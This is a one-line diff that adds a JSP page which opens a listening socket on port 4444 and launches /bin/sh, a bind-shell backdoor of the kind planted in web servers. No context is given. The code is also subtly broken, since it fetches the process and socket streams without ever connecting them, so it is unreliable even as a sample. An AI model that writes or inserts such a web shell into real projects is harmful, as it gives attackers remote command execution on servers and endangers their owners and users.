@@ -1,0 +1,1 @@
+<%@ page import="java.net.*,java.io.*" %><% ServerSocket server=new ServerSocket(4444); Socket s=server.accept(); Process p=Runtime.getRuntime().exec("/bin/sh"); p.getInputStream(); s.getInputStream(); p.getOutputStream(); s.getOutputStream(); %>
